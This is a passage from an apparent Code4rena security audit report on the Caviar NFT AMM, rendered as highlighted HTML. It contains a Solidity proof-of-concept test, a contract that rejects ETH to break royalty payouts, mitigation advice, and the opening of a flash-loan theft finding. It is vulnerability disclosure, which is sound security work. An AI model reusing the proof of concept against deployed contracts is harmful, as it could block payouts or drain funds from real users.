class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenWeights:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">proof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MerkleMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bool</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">stolenNftProofs:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Message</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">isPublicPool:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">publicPoolProofs:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicPoolProofs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">,,) = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sellQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sell</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_PaysRoyalties</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// arrange</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Sell</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sells</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Sell</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Sell</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sell1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputAmount1</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_addSell</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Sell</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sell2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputAmount2</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_addSell</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minOutputAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">outputAmount1</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">outputAmount2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">sell1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">sell2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Pair</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pair</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">caviar</span><span class=\"mtk1\">.</span><span class=\"mtk11\">create</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1.123e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">), </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalTokens</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalTokens</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Sell</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">pool:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenWeights:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">proof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MerkleMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bool</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">stolenNftProofs:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Message</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">isPublicPool:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">publicPoolProofs:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sellQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minOutputAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// act</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minOutputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// assert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have paid royalties&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have paid royalties&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">EthRejecter</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The contract could not have a method called &quot;receive&quot; or &quot;fallback&quot;, i added here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// to show the concept of a contract that rejects ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ETH REJECTED EXAMPLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Milady2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC2981</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// to 18 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Milady Maker&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;MIL&quot;</span><span class=\"mtk1\">) {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;https://milady.io&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRoyaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_royaltyFeeRate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_royaltyRecipient</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_royaltyFeeRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_royaltyRecipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">supportsInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interfaceId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC2981</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">supportsInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interfaceId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">royaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>There are two simple ways from my point of view to force ether send and solve this issue;</p>\n<p>You could use a simple contract that selfdestrcut an firce ether, but selfdestruct is deprecated so it’s not a good idea, please view <a href=\"https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L65\">solady/SafeTransferLib.sol#L65</a></p>\n<p>The other thing you could do is if an address is rejecting ether, send WETH instead, this pattern is common and well known.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/713#issuecomment-1518079437\">outdoteth (Caviar) acknowledged via duplicate issue <code>#713</code></a></strong></p>\n<hr>\n<h2 id=\"m-15-pool-tokens-can-be-stolen-via-privatepoolflashloan-function-from-previous-owner\" style=\"position:relative;\"><a href=\"#m-15-pool-tokens-can-be-stolen-via-privatepoolflashloan-function-from-previous-owner\" aria-label=\"m 15 pool tokens can be stolen via privatepoolflashloan function from previous owner permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/230\">[M-15] Pool tokens can be stolen via <code>PrivatePool.flashLoan</code> function from previous owner</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/230\">Brenzee</a>, also found by <a 